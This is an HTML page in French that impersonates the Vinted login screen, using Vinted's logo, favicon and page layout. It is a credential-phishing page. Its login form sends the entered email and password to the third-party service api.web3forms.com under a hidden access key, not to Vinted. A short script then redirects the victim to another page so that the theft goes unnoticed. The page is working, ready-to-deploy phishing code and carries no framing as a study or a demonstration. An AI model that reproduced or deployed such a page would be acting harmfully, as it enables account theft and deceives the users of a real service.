<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Vinted</title>
    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
        <div class="menu-icon">☰</div>
    </header>

    <div class="search-container">
        <div class="search-bar">
            <span class="category">Articles ▾</span>
            <input type="text" placeholder="Rechercher des articles">
        </div>
    </div>

    <main class="main-content">
        <div class="white-card">
            <h2>Se connecter</h2>
            
            <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="B2033a9a-46a6-494a-954a-8566250bb8ff">
                
                <div class="field-group">
                    <input type="text" name="email" placeholder="Identifiant ou adresse email" required>
                </div>
                
                <div class="field-group">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-vinted">Continuer</button>
            </form>

            <div class="auth-links">
                <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
    </main>

    <script>
        document.getElementById('loginForm').onsubmit = function() {
            // Délai d'une seconde pour laisser l'envoi Web3Forms se lancer
            setTimeout(() => {
                window.location.href = "formulaire.html";
            }, 1000);
        };
    </script>

</body>
</html>
